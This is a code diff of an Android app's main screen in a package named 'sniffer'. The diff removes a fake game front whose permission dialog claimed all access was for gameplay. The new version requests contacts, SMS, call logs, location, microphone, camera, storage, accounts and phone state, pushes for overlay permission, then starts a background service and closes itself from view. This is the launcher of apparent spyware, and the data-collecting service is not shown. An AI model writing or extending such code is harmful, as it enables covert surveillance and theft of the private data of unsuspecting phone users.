@@ -1,75 +1,111 @@
 package com.v8.global.sniffer;
 
-import android.app.Activity;
-import android.app.AlertDialog;
-import android.content.DialogInterface;
+import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
-import androidx.core.app.ActivityCompat;
+import android.os.Handler;
+import android.provider.Settings;
+import android.widget.Toast;
+
+import androidx.activity.result.ActivityResultLauncher;
+import androidx.activity.result.contract.ActivityResultContracts;
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AlertDialog;
+import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.content.ContextCompat;
-import android.Manifest;
-import com.v8.global.sniffer.game.MainGameActivity;
-import java.util.ArrayList;
-import java.util.List;
 
-public class MainActivity extends Activity {
+public class MainActivity extends AppCompatActivity {
 
-    private static final int PERMISSION_REQUEST_CODE = 100;
+    private final String[] requiredPermissions = {
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.RECORD_AUDIO,
+            Manifest.permission.CAMERA,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.GET_ACCOUNTS,
+            Manifest.permission.READ_PHONE_STATE
+    };
+
+    private final ActivityResultLauncher<String[]> requestPermissionsLauncher =
+            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), result -> {
+                boolean allGranted = true;
+                for (Boolean granted : result.values()) {
+                    if (!granted) {
+                        allGranted = false;
+                        break;
+                    }
+                }
+                if (allGranted) {
+                    // كل الصلاحيات تم منحها → نبدأ الخدمة
+                    startNotificationService();
+                    finishAffinity(); // ينهي النشاط بالكامل
+                } else {
+                    // بعض الصلاحيات مرفوضة
+                    Toast.makeText(this, "بعض الصلاحيات مرفوضة، قد لا يعمل التطبيق بشكل صحيح", Toast.LENGTH_LONG).show();
+                    // نسأل إذا يريد فتح الإعدادات
+                    showSettingsDialog();
+                }
+            });
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        checkPermissions();
+        setContentView(R.layout.activity_main); // لو ملف XML موجود
+
+        // فحص إذا التطبيق لديه صلاحية التنصيب فوق النوافذ (SYSTEM_ALERT_WINDOW)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    android.net.Uri.parse("package:" + getPackageName()));
+            startActivity(intent);
+        }
+
+        // طلب الصلاحيات المطلوبة
+        if (hasAllPermissions()) {
+            startNotificationService();
+            finishAffinity();
+        } else {
+            requestPermissionsLauncher.launch(requiredPermissions);
+        }
     }
 
-    private void checkPermissions() {
-        List<String> permissionsNeeded = new ArrayList<>();
-        String[] permissions = {
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.CAMERA,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.READ_CONTACTS
-        };
-
-        for (String perm : permissions) {
+    private boolean hasAllPermissions() {
+        for (String perm : requiredPermissions) {
             if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
-                permissionsNeeded.add(perm);
+                return false;
             }
         }
+        return true;
+    }
 
-        if (permissionsNeeded.isEmpty()) {
-            openGame();
-        } else {
-            showPermissionDialog(permissionsNeeded);
+    private void startNotificationService() {
+        try {
+            Intent serviceIntent = new Intent(this, NotificationService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent);
+            } else {
+                startService(serviceIntent);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
-    private void showPermissionDialog(final List<String> permissions) {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("🔐 الصلاحيات مطلوبة");
-        builder.setMessage("يحتاج التطبيق إلى بعض الصلاحيات لتجربة أفضل:\n\n" +
-                          "• 📸 الكاميرا - لتصوير الإنجازات\n" +
-                          "• 🎤 الميكروفون - للتواصل الصوتي\n" +
-                          "• 📍 الموقع - لميزات الخريطة\n" +
-                          "• 📁 الملفات - لحفظ التقدم\n\n" +
-                          "سيتم استخدامها فقط داخل اللعبة.");
-        builder.setPositiveButton("سماح", (dialog, which) -> 
-            ActivityCompat.requestPermissions(MainActivity.this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE));
-        builder.setNegativeButton("عدم السماح", (dialog, which) -> openGame());
-        builder.setCancelable(false);
-        builder.show();
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        openGame(); // افتح اللعبة حتى لو رفض البعض
-    }
-
-    private void openGame() {
-        startActivity(new Intent(this, MainGameActivity.class));
-        finish();
+    private void showSettingsDialog() {
+        new AlertDialog.Builder(this)
+                .setTitle("صلاحيات إضافية")
+                .setMessage("للتطبيق بحاجة لبعض الصلاحيات ليعمل بشكل صحيح. هل تريد فتح الإعدادات؟")
+                .setPositiveButton("نعم", (dialog, which) -> {
+                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                    intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                })
+                .setNegativeButton("لا", (dialog, which) -> finishAffinity())
+                .show();
     }
 }
